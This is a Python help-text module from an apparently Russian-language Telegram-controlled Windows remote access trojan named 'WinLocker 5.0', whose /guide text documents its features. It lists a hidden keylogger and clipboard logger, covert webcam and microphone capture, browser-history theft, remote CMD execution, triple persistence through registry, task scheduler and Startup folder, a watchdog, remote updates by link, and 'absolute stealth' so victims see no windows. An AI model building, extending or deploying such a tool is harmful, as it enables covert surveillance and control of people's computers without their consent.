# readme.py
"""
Модуль документации для бота удаленного администрирования Windows.
Предоставляет команду /guide с подробным описанием функционала бота.
"""

import os
import sys
from telebot import types

# Импорт модулей проекта
from bot_core import get_bot, command_handler, logger, db
from bot_services import get_system_info

# Ленивая инициализация бота
_bot_instance = None

def get_bot_instance():
    """Получение экземпляра бота с ленивой инициализацией"""
    global _bot_instance
    if _bot_instance is None:
        _bot_instance = get_bot()
    return _bot_instance

bot = get_bot_instance()

def get_guide_text():
    """Генерация текста документации для команды /guide"""
    
    guide_text = """
📚 <b>РУКОВОДСТВО ПО ИСПОЛЬЗОВАНИЮ БОТА - ВЕРСИЯ 5.0</b>

🏗️ <b>ОТЧЕТ ОБ АРХИТЕКТУРЕ</b>
• <b>Модульная архитектура</b>: bot_core.py (ядро), bot_commands.py (обработчики), bot_services.py (системные функции), bot_callbacks.py (интерактивные кнопки)
• <b>База данных</b>: SQLite с таблицами admins, devices, sessions, action_logs
• <b>Безопасность</b>: Двухуровневая система прав (SuperAdmin, Admin), защита от directory traversal
• <b>Логирование</b>: Unified logger (клавиатура + буфер обмена) с шифрованием, логи действий в БД
• <b>Стелс-режим</b>: Все системные команды выполняются без окон (CREATE_NO_WINDOW)
• <b>Обход лимитов Telegram</b>: Длинные выводы (/history, /app_list) отправляются как файлы
• <b>Интерактивность</b>: Inline-кнопки, state-машина для подтверждений, файловый менеджер

🤖 <b>ОСНОВНАЯ ИНФОРМАЦИЯ</b>
• Бот предназначен для удаленного администрирования Windows-устройств
• Поддерживает управление несколькими устройствами через единый интерфейс
• Имеет встроенную систему автозапуска и мониторинга (watchdog)

🔐 <b>СИСТЕМА БЕЗОПАСНОСТИ (ОБНОВЛЕНО)</b>
• <b>Двухуровневая система прав</b>: Супер-админ, Админ (роль "Гость" удалена)
• <b>Полная скрытность</b>: Бот не отвечает незнакомым пользователям
• Подтверждение опасных действий через текстовые команды
• Защита от directory traversal атак в файловых операциях
• Логирование всех действий в базу данных

⚡ <b>АВТОЗАПУСК И НАДЕЖНОСТЬ</b>
• Тройная система автозапуска (реестр, планировщик задач, папка Startup)
• Watchdog процесс для автоматического восстановления бота
• Автоматическое обновление по ссылке (OTA updates)
• <b>Абсолютный стелс</b>: Никаких окон CMD/PowerShell при выполнении команд

📱 <b>ОСНОВНЫЕ КОМАНДЫ УПРАВЛЕНИЯ (ОБНОВЛЕНО)</b>

<b>Управление устройствами:</b>
• /panel - Inline-панель управления (рекомендуется) с кнопкой CMD
• /pc_list - Список всех устройств
• /info - Информация о текущем устройстве
• /active - Активное окно/приложение

<b>Мультимедиа и мониторинг (ОБНОВЛЕНО):</b>
• /screen - Скриншот экрана
• /webcam [задержка] - Захват изображения с веб-камеры (опциональная задержка 0-10 сек)
• /mic [длительность] - Запись звука с микрофона (1-60 сек, по умолчанию 5)
• /clipboard - Содержимое буфера обмена
• /keyboard - Объединенный лог клавиатуры и буфера обмена (unified logger)
• /history - История браузера (отправляется как файл)
• /app_list - Список установленных приложений (отправляется как файл)

<b>Системный мониторинг:</b>
• /procs - Список запущенных процессов
• /kill [имя_процесса] - Завершение процесса
• /full_scan - Полное сканирование системы
• /deep_scan - Глубокое сканирование системы

<b>Управление питанием (требует подтверждения):</b>
• /lock - Блокировка компьютера
• /reboot - Перезагрузка компьютера
• /poweroff - Выключение компьютера

<b>Файловые операции (ИСПРАВЛЕНО):</b>
• /list_files [путь] - Просмотр файлов в директории с информацией о размере и дате
• /change_dir [путь] - Изменение рабочей директории
• /download [путь] - Загрузка файла с устройства
• /rm [путь] - Удаление файла (требует подтверждения)

<b>Администрирование:</b>
• /admin_list - Список администраторов
• /add_admin [id] - Добавление администратора (интерактивный режим если id не указан)
• /del_admin [id] - Удаление администратора
• /urs_update [ссылка] - OTA обновление по ссылке
• /wd_download [ссылка] - Загрузка watchdog.exe
• /wd_on - Запуск watchdog
• /wd_off - Остановка watchdog

<b>Прочие команды:</b>
• /message [текст] - Отправка сообщения на устройство
• /cmd [команда] - Выполнение команды CMD
• /commands или /coms - Полный список команд
• /guide - Это руководство

🎯 <b>ИНТЕРАКТИВНАЯ ПАНЕЛЬ УПРАВЛЕНИЯ</b>
Используйте /panel для доступа к интерактивному меню:
1. <b>Главная панель</b> - Выбор устройства
2. <b>Панель команд</b> - Основные функции выбранного устройства
3. <b>Управление питанием</b> - Блокировка/перезагрузка/выключение
4. <b>Кнопка CMD</b> - Интерактивный ввод команд через state-машину
5. <b>Файловый менеджер</b> - Просмотр, чтение, скачивание, удаление файлов

Все опасные действия в панели также требуют текстового подтверждения.

⚠️ <b>СИСТЕМА ПОДТВЕРЖДЕНИЯ ОПАСНЫХ ДЕЙСТВИЙ</b>
Команды /lock, /reboot, /poweroff, /rm, /message требуют подтверждения:
1. Бот переходит в режим ожидания
2. Отправляет: "⚠️ Требуется подтверждение. Отправьте слово config для выполнения или cancel для отмены"
3. При вводе "config" - действие выполняется
4. При вводе "cancel" или любого другого слова - операция отменяется

🔧 <b>ТЕХНИЧЕСКИЕ ДЕТАЛИ (ОБНОВЛЕНО)</b>
• <b>База данных</b>: SQLite (database.py) с исправленным методом log_action
• <b>Логирование</b>: Unified encrypted logger для клавиатуры и буфера обмена
• <b>Обработка ошибок</b>: Централизованная через декоратор @command_handler
• <b>Многопоточность</b>: Для длительных операций и фонового мониторинга
• <b>Кодировка</b>: UTF-8 для поддержки русского языка
• <b>Совместимость</b>: Windows 7/8/10/11, Python 3.7+, скомпилирован в .exe через PyInstaller

📞 <b>ПОДДЕРЖКА И ОБНОВЛЕНИЯ</b>
• Автоматические обновления через /urs_update
• Ручное обновление watchdog через /wd_download
• Логи доступны администраторам
• Система восстановления при сбоях

🚀 <b>ПОСЛЕДНИЕ ИСПРАВЛЕНИЯ (ВЕРСИЯ 5.0)</b>
1. ✅ Исправление базы данных (log_action) - параметр details вместо action_details
2. ✅ Абсолютный стелс - замена os.system на subprocess.run с CREATE_NO_WINDOW
3. ✅ Исправление кейлоггера - запуск unified logger, отправка через io.BytesIO
4. ✅ Параметры времени для /mic и /webcam
5. ✅ Обход лимитов Telegram - /history и /app_list отправляются как файлы
6. ✅ Работа с файлами - улучшенный list_files, исправления валидации путей
7. ✅ Обновленное руководство с отчетом об архитектуре

Для начала работы используйте /panel или выберите устройство через /pc_list
    """
    
    return guide_text.strip()


@bot.message_handler(commands=['guide', 'help', 'документация', 'руководство'])
@command_handler
def guide_command(message):
    """Команда /guide - отправка полного справочника проекта (архитектура как в /history)"""
    user_id = message.from_user.id
    
    try:
        # Импортируем функцию генерации справочника из bot_services
        from bot_services import generate_project_guide
        
        # Отправляем сообщение о начале генерации (как в /history)
        bot.reply_to(message, "📚 Генерирую полный справочник проекта...")
        
        # Получаем текст справочника
        guide_lines = generate_project_guide()
        if not isinstance(guide_lines, list):
            raise TypeError(f"Функция generate_project_guide вернула {type(guide_lines)} вместо списка")
        
        guide_text = "\n".join(guide_lines)
        
        # Создаем файл в памяти (используем io.BytesIO как в /history)
        import io
        from datetime import datetime
        
        file_data = io.BytesIO(guide_text.encode('utf-8'))
        
        # КРИТИЧЕСКИ ВАЖНО: Telegram API требует наличия имени файла
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"project_guide_{timestamp}.txt"
        file_data.name = filename
        
        # Простой заголовок как в /history
        caption = f"📚 Полный справочник проекта WinLocker 5.0\n📅 Сгенерировано: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nСодержит анализ Python файлов, структуры БД, работы DLL и списка команд."
        
        # Отправляем файл через send_document (как в /history) БЕЗ reply_markup
        bot.send_document(
            message.chat.id,
            file_data,
            caption=caption,
            visible_file_name=filename
        )
        
        # Логируем действие
        db.log_action(user_id, None, "guide_command", details=f"Файл: {filename}")
        
        # Отправляем краткий отчет (аналогично /history)
        report = f"✅ Справочник проекта сгенерирован:\n• Файл: {filename}\n• Размер: {len(guide_text.encode('utf-8'))} байт"
        
        # Используем send_success_message если доступна, иначе обычный reply
        try:
            from bot_commands import send_success_message
            send_success_message(message.chat.id, report)
        except ImportError:
            bot.reply_to(message, report)
        
    except ImportError as e:
        logger.error(f"Ошибка импорта generate_project_guide: {e}")
        bot.reply_to(message, "❌ Ошибка: функция generate_project_guide не найдена в bot_services.")
    except Exception as e:
        logger.error(f"Ошибка при генерации справочника: {e}")
        bot.reply_to(message, f"❌ Ошибка при генерации справочника: {str(e)[:200]}")


def get_quick_start_guide():
    """Краткое руководство по быстрому старту"""
    return """
🚀 <b>БЫСТРЫЙ СТАРТ:</b>

1. <b>Добавьте устройство</b> - запустите бот на целевом компьютере
2. <b>Выберите устройство</b> - используйте /panel или /pc_list
3. <b>Используйте панель</b> - /panel для интерактивного управления
4. <b>Изучите возможности</b> - /guide для полной документации

Основные команды для начала:
• /panel - интерактивная панель управления
• /screen - проверить доступ к устройству
• /info - получить информацию об устройстве
• /commands - полный список команд
    """


# Функция для получения информации о системе (для отладки)
def get_system_info_text():
    """Получение информации о системе в текстовом формате"""
    try:
        info = get_system_info()
        if info:
            text = "📊 <b>Информация о системе:</b>\n\n"
            text += f"🖥 CPU: {info.get('cpu_percent', 'N/A')}% ({info.get('cpu_count', 'N/A')} ядер)\n"
            text += f"🧠 ОЗУ: {info.get('memory_percent', 'N/A')}% ({info.get('memory_used_gb', 0):.1f}/{info.get('memory_total_gb', 0):.1f} GB)\n"
            text += f"💾 Диск: {info.get('disk_percent', 'N/A')}% ({info.get('disk_used_gb', 0):.1f}/{info.get('disk_total_gb', 0):.1f} GB)\n"
            text += f"⏱ Аптайм: {info.get('uptime_hours', 0)}ч {info.get('uptime_minutes', 0)}мин\n"
            text += f"🌐 IP: {info.get('ip_address', 'N/A')}"
            return text
        else:
            return "⚠️ Не удалось получить информацию о системе"
    except Exception as e:
        logger.error(f"Ошибка получения информации о системе: {e}")
        return f"❌ Ошибка: {str(e)}"


# Экспортируемые функции
__all__ = [
    'guide_command',
    'get_guide_text',
    'get_quick_start_guide',
    'get_system_info_text'
]